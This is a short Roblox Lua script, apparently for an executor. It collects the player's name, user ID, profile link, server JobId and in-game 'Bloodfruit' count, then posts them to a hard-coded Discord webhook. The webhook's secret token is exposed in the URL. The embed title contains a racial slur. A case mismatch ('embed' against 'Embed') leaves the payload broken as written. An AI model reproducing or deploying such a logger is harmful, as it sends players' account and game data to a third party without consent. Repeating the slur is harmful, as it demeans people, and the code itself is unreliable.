local os_time = os.time()
local time = os.date('!*t', os_time)

local GU = require(game.ReplicatedStorage.Modules.GameUtil)

local function GetAmount(name)
    for k, v in next, GU.GetData().inventory do
        if v.name == name then
            return v.quantity
        end
    end

    return nil
end

local embed = {

    title = 'this nigga got logged';

    color = '00000';

    footer = { text = game.JobId };

    author = {
        name = game.Players.LocalPlayer.Name;
        url = 'https://www.roblox.com/users/' .. tostring(game.Players.LocalPlayer.UserId) .. '/profile';
    };

    fields = {

        {

            name = 'Bloodfruit Value';

            value = tostring(GetAmount("Bloodfruit"));

        }

    };

    timestamp = string.format('%d-%d-%dT%02d:%02d:%02dZ', time.year, time.month, time.day, time.hour, time.min, time.sec);
    
}

request({
    Url = "https://discord.com/api/webhooks/1228165437129363456/1yr5LKj_wJubXSVZynvsvG-nrIQz5P2mSw0bhxz8delr6E7005yj-slg3L9DPKwBf6Us",
    Method = "POST",
    Headers = {
        ['Content-Type'] = 'application/json';
    },
    Body = game:GetService'HttpService':JSONEncode( { embeds = { Embed } } )
})
